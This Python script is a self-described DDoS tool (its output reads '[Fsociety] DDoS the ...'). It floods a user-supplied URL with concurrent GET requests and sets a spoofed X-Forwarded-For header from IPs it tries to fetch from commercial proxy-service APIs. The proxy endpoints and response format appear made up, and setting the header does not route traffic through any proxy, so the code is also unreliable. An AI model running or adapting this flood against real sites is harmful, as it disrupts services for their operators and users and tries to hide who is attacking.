import asyncio
import aiohttp
import random
from colorama import Fore


target_url = input("Enter URL: ")

# API keys
BRIGHTDATA_API_KEY = 'YOUR_BRIGHTDATA_API_KEY'
OXYLABS_API_KEY = 'YOUR_OXYLABS_API_KEY'
PROXYMESH_API_KEY = 'YOUR_PROXYMESH_API_KEY'


BRIGHTDATA_API_URL = f'https://proxy.brightdata.com:22225?token={BRIGHTDATA_API_KEY}&url={target_url}'
OXYLABS_API_URL = f'https://api.oxylabs.io/v1/ips?token={OXYLABS_API_KEY}&url={target_url}'
PROXYMESH_API_URL = f'https://api.proxymesh.com/ip-rotation?api_key={PROXYMESH_API_KEY}&url={target_url}'

# BrightData
async def get_brightdata_proxy():
    async with aiohttp.ClientSession() as session:
        async with session.get(BRIGHTDATA_API_URL) as response:
            if response.status == 200:
                data = await response.json()
                return data['ip']  
            else:
                print(f"Error fetching proxy from BrightData: {response.status}")
                return None

# Oxylabs
async def get_oxylabs_proxy():
    async with aiohttp.ClientSession() as session:
        async with session.get(OXYLABS_API_URL) as response:
            if response.status == 200:
                data = await response.json()
                return data['ip']  
            else:
                print(f"Error fetching proxy from Oxylabs: {response.status}")
                return None

# ProxyMesh
async def get_proxymesh_proxy():
    async with aiohttp.ClientSession() as session:
        async with session.get(PROXYMESH_API_URL) as response:
            if response.status == 200:
                data = await response.json()
                return data['ip']  
            else:
                print(f"Error fetching proxy from ProxyMesh: {response.status}")
                return None


async def get_proxy():

    proxy_service = random.choice([get_brightdata_proxy, get_oxylabs_proxy, get_proxymesh_proxy])
    return await proxy_service()

num_requests = int(input("Enter the number of requests to send: "))

async def send_request(proxy_ip):
    headers = {
        "X-Forwarded-For": proxy_ip 
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, headers=headers) as response:
                print(Fore.RED + f"[Fsociety]" + Fore.WHITE + f"DDoS the {target_url} from Proxy IP: {proxy_ip} - Status Code: {response.status}")
    except Exception as e:
        print(f"Error sending request from Proxy IP: {proxy_ip} - {e}")


async def main():
    tasks = []
    for _ in range(num_requests):
        proxy_ip = await get_proxy()  
        if proxy_ip:
            tasks.append(send_request(proxy_ip))  
    await asyncio.gather(*tasks)

asyncio.run(main())